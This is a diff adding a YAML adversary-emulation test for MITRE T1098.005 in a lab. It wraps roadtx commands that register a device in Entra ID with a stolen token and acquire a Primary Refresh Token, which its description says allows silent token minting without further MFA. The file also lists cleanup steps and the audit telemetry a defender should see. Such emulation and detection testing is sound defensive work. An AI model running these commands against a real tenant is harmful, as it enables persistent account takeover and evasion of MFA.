@@ -1,0 +1,70 @@
+attack_technique: T1098.005
+display_name: "Defense Evasion – Device Registration and PRT Acquisition"
+atomic_tests:
+  - name: "Register lab device and acquire PRT via roadtx"
+    auto_generated_guid: e1f2a3b4-c5d6-7890-efab-890123456710
+    description: |
+      Registers an attacker-controlled device with Entra ID using a stolen
+      access token, then acquires a Primary Refresh Token (PRT) tied to that
+      device. With a PRT, the attacker can silently mint tokens for any
+      resource without further MFA. Wraps roadtx prt and roadtx device.
+    supported_platforms:
+      - windows
+      - linux
+      - macos
+    input_arguments:
+      tenant_id:
+        description: "Entra tenant ID of the lab tenant."
+        type: String
+        default: "00000000-0000-0000-0000-000000000000"
+      device_name:
+        description: "Display name for the registered device."
+        type: String
+        default: "TackleboxLabDevice"
+      token_input_path:
+        description: "Path to an existing token cache (requires Device.ReadWrite.All or similar)."
+        type: Path
+        default: "#{token_cache_path}"
+      prt_output_path:
+        description: "Path to write the acquired PRT."
+        type: Path
+        default: "#{token_cache_path}"
+    executor:
+      name: powershell
+      command: |
+        roadtx device `
+          --action register `
+          --name '#{device_name}' `
+          --tenant '#{tenant_id}' `
+          --tokenfile '#{token_input_path}'
+
+        roadtx prt `
+          --action request `
+          --tenant '#{tenant_id}' `
+          --tokenfile '#{prt_output_path}'
+    cleanup_command: |
+      roadtx device `
+        --action delete `
+        --name '#{device_name}' `
+        --tenant '#{tenant_id}' `
+        --tokenfile '#{token_input_path}'
+    references:
+      - "https://dirkjanm.io/abusing-azure-ad-sso-with-the-on-behalf-of-flow/"
+      - "https://aadinternals.com/post/prt/"
+    auth_profile: "device-registration-prt"
+    defense_evasion: "PRT acquisition via attacker-registered device; enables silent SSO token minting"
+    requires_token:
+      from: "device-code"
+      resource: "https://graph.microsoft.com"
+    expected_telemetry:
+      - source: graph_audit
+        match:
+          activityDisplayName: "Register device"
+        within_minutes: 10
+      - source: entra_signin
+        match:
+          authenticationProtocol: "deviceCode"
+        within_minutes: 15
+    exercises_chokepoint:
+      id: "DC-EVAS-007"
+      url: "https://detectionchokepoints.com/evasion/device-registration-prt"
